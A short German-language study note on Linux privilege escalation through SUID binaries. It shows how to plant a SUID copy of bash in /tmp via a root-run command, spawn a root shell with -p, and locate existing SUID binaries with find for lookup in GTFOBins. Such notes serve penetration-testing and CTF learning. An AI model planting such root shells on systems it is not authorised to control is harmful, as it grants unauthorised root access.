---
tags: [technique, privesc, linux]
---
# SUID Abuse

> **SUID-Bit**: Ein Programm läuft **immer mit den Rechten seines Besitzers**, egal wer es startet. Gehört es root → Ausführung als root.

## SUID-Bash als Root-Shell

Wenn ein root-Prozess (Cronjob, Service, Sudo-Befehl) einen Befehl für dich ausführt:

```bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

Dann:

```bash
/tmp/rootbash -p     # -p = erhöhte Rechte behalten
id                   # euid=0(root)
```

> [!danger] `chmod +s` reicht nicht
> `+s` → `-rws--S---` (SUID, aber **kein `x`** für Gruppe/Andere) → `Permission denied`.
> `chmod 4755` → `-rwsr-xr-x` → ausführbar für alle. Zahlen-Logik → [[Dateirechte und chmod]].

## Vorhandene SUID-Binaries finden

```bash
find / -perm -4000 -type f 2>/dev/null
```

=> gefundene Binaries gegen [GTFOBins](https://gtfobins.github.io/) prüfen.

## Warum `-p`?

Ohne `-p` wirft bash die SUID-Rechte beim Start aus Sicherheit weg. Mit `-p` bleibst du root.